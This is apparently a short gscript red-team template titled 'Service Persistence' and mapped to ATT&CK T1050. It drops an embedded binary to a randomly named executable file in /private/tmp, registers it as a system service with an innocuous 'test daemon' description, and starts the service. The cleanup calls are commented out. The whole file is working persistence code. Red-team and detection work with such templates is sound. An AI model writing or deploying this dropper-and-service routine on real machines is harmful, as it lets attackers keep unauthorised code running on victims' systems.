// Example gscript template
// Title: Service Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a default gscript service install
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1050

//priority:100 
//timeout:30 
//import:/private/tmp/example.macho

var service_label = "Gscript Daemon";
var service_name = "gscriptdaemon";
var service_desc = "this is a test daemon.";

function BeforeDeploy() {
  LogInfo("Starting install service persistence.");
  return true;
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var path = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    path += possible.charAt(Math.floor(Math.random() * possible.length));
  path = "/private/tmp/"+path;
  WriteFile(path, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+path);

  InstallSystemService(path, service_name, service_label, service_desc);
  LogInfo("Service Installed");
  StartServiceByName(service_name);
  LogInfo("Service Started");
  return true;
}

function AfterDeploy() {
  //StopServiceByName("gscriptdaemon");
  //LogInfo("service stopped");
  //Sleep(5)
  //RemoveServiceByName("gscriptdaemon");
  //LogInfo("service removed");
  return true;
}
